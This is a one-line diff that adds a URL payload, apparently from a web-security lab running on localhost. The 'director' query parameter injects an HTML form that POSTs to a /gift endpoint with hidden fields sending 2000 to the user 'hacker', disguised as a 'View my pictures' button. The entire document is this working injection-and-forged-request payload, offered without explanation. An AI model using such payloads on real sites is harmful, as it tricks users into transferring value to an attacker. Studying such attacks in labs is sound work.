@@ -1,0 +1,1 @@
+http://127.0.0.1:8000/gift.html?director=<form action="http://127.0.0.1:8000/gift/0" method="POST"> <input type="hidden" name="amount" value="2000"/> <input type="hidden" name="username" value="hacker"/><input type="submit" value="View my pictures"/> </form>
